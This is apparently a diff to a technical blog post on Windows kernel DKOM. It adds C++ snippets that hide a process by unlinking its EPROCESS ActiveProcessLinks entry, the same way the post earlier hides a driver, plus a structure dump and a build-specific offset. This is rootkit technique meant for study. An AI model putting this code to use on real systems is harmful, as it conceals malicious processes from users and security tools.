@@ -71,6 +71,10 @@ PLIST_ENTRY NextModule = ThisModule->Flink;
 PrevModule->Flink = NextModule;
 // Replace NextModule Blink with PrevModule's address
 NextModule->Blink = PrevModule;
+
+// point target process to itself
+ThisModule->Flink = ThisModule;
+ThisModule->Blink = ThisModule;
 ```
 
 And since you have access to the driver `KLDR_DATA_TABLE_ENTRY`, you can check your work:
@@ -104,6 +108,49 @@ NTSTATUS FindKernelModule(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING
 	return STATUS_UNSUCCESSFUL;
 }
 ```
+
+This same type of unlinking behavior can be used to hide a process. In kernel mode, a process can be looked up by its ID using `PsLookupProcessByProcessId`:
+
+```c++
+// turn the PID into an EPROCESS pointer
+PEPROCESS Process;
+status = PsLookupProcessByProcessId((HANDLE)data->pid, &Process);
+if (!NT_SUCCESS(status))
+	break;
+```
+
+Where PEPROCESS represent a pointer to an EPROCESS structure like this:
+```
+2: kd> dt _EPROCESS
+ntdll!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
+   +0x2e8 UniqueProcessId  : Ptr64 Void
+   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
+   +0x300 RundownProtect   : _EX_RUNDOWN_REF
+   +0x308 Flags2           : Uint4B
+... (truncated
+```
+
+With a pointer to the target process's EPROCESS structure in hand, it can be scanned for the `ActiveProcessLinks` member. Once this member is found, hiding the process is the exact same for hiding a driver process:
+
+```c++
+// get the ActiveProcesLinks address
+auto CurrentListEntry = (PLIST_ENTRY)((PUCHAR)Process + offset);
+
+auto PrevListEntry = CurrentListEntry->Blink;
+auto NextListEntry = CurrentListEntry->Flink;
+
+// unlink the target process
+PrevListEntry->Flink = NextListEntry;
+NextListEntry->Blink = PrevListEntry;
+
+// point target process to itself
+CurrentListEntry->Flink = CurrentListEntry;
+CurrentListEntry->Blink = CurrentListEntry;
+```
+On Windows 10 1901 build 18363, the `ActiveProcessLinks` member is located at offset `0x2f0`. This offset changes between builds.
+
 The full source for an example driver can be found [here](https://github.com/joshfinley/DKOM_Demo).
 
 Of course, none of this is anything new: 
@@ -111,4 +158,5 @@ Of course, none of this is anything new:
 ## References
 - [blackbone implementation to find PsLoadedModuleList](https://github.com/DarthTon/Blackbone/blob/master/src/BlackBoneDrv/Loader.c)
 - [all sorts of ways of finding module addresses](https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo)
-- [another implementation of the same driver](https://vxug.fakedoma.in/papers/Hiding%20loaded%20driver%20with%20DKOM%20.txt)
+- [another implementation of the same driver hiding functionality](https://vxug.fakedoma.in/papers/Hiding%20loaded%20driver%20with%20DKOM%20.txt)
+- [the reference implementation for the process hiding functionality](https://vxug.fakedoma.in/papers/Hide%20process%20with%20DKOM%20without%20hardcoded%20offsets.txt)
